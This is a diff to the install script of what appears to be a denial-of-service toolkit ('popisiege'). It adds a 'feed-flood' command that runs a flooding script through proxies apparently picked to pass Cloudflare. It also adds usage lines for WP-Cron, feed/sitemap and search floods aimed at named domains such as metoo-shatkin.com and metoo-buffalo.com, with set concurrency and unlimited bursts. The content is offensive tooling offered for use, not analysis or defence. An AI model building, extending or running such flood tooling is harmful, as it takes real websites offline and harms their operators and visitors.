@@ -81,6 +81,9 @@ _make_cmd /usr/local/bin/popicron \
 _make_cmd /usr/local/bin/refresh-proxies \
     "exec bash /opt/popisiege/refresh_proxies.sh"
 
+_make_cmd /usr/local/bin/feed-flood \
+    "exec python3 /opt/popisiege/feed_flood.py --proxy-file /opt/popisiege/proxies_cf_passing_new.txt \"\$@\""
+
 # ── done ───────────────────────────────────────────────────────────────────────
 echo ""
 echo -e "${B}=============================="
@@ -95,7 +98,13 @@ echo ""
 echo -e "  ${B}WP-Cron Flood (US proxies):${W}"
 echo    "    refresh-proxies"
 echo    "    popicron --target metoo-buffalo.com --concurrency 25"
-echo    "    popicron --concurrency 30 --bursts 0"
+echo    "    popicron --concurrency 30 --bursts 0
+
+  Feed/Sitemap/Home Flood (shatkin open endpoints):
+    refresh-proxies
+    feed-flood --target metoo-shatkin.com --concurrency 25
+    feed-flood --target metoo-shatkin.com --concurrency 25 --endpoints feed sitemap
+    feed-flood --concurrency 30 --bursts 0"
 echo ""
 echo -e "  ${B}Search Flood (PHP + MySQL):${W}"
 echo    "    search-flood --verbose"
